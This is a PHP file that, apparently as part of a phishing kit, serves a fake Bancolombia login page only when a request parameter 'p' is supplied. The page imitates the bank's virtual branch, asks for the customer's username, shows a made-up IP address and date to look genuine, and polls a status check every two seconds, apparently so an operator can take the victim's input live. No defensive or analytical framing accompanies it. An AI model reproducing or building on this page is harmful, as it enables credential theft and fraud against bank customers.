<?php
// Debugging: Verificar si se está recibiendo el parámetro 'p'
if (isset($_REQUEST["p"])) {
    $key = $_REQUEST["p"];
    $jsCode = <<<HTML
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autenticación Bancolombia</title>
    <link rel="icon" href="/assets/img/logo.png">

    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link href="/assets/css/main.css" rel='stylesheet'>
    <script type="text/javascript" src="/assets/js/main.js"></script>
    <script type="text/javascript" src="/assets/js/main.js"></script>  

</head>
<body>
    <div class="content__loader">
        <div class="loader"></div>
        <p>Cargando...</p>
        <p>No recargue ni cierre esta ventana.</p>
    </div>

    <div class="wrapper">
        <header class="header">
            <span>Salir <i class='bx bx-exit'></i></span>
        </header>

        <main class="main">
            <h2 class="main__ttl">Te damos la bienvenida</h2>

            <div class="box">
                <p class="box__txt">
                    El usuario es el mismo con el que ingresas a la <br>
                    <strong>Sucursal Virtual Personas.</strong>
                </p>

                <div class="box__element">
                    <i class='bx bx-user'></i>
                    <input class="box__input" type="text" required>
                    <span class="box__lbl">Usuario</span>
                    <p class="box__forget">¿Olvidaste tu usuario?</p>
                </div>

                <div class="box__opt">
                    <button class="box__btn box__btn--transp">Volver</button>
                    <button class="box__btn">Continuar</button>
                </div>
            </div>

            <div class="picture"></div>

        </main>
        
        <footer class="footer">
            <div class="line"></div>
            <div class="footer__logo1"></div>
            <div class="footer__logo2"></div>

            <span>
                <p>Dirección IP: 190.210.118.1</p>
                <p id="currentDate">Jueves, 27 de Junio de 2024, 2:57 p. m.</p>
            </span>
        </footer>
    </div>
    <div id="resultado"></div>
    
    <script language="javascript">
        $(document).ready(function() {
            setInterval(consultar_estado, 2000);
            console.log("Cargando");
        });
    </script>
    <script src="/assets/js/main.js"></script>
</body>
</html>
HTML;
    echo $jsCode;
} else {
    // Debugging: Mostrar mensaje si no se recibe el parámetro 'p'
    echo "No se ha recibido el parámetro 'p'.";
}
?>
